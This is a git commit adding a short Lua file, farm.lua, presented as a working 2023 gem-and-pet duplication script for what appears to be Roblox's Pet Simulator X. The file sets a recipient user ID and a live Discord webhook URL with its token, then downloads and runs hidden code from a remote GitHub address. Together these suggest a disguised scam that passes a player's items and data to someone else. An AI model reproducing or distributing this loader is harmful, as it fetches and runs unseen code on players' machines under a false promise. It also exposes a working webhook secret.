bebd21f21f719e3aa6c80d7eb77674bd9959be09
WYNDYSCRIPTS <127653421+WYNDYSCRIPTS@users.noreply.github.com>
2023-03-12 11:14:51 +0300

    Create farm.lua

---
+++ farm.lua
@@ -0,0 +1,6 @@
+SCRIPT DUPE GEMS AND PETS WORK 2023
+ 
+ 
+_G.UserID = 2636219312
+_G.WebHook = "https://discord.com/api/webhooks/1068869279807709234/bs2sV_CngBLqoMRQSbUKlXRtq7g48YhedaC4CRp9m-5D7HA3LIsBVcBboY1gwfl5GNAJ"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
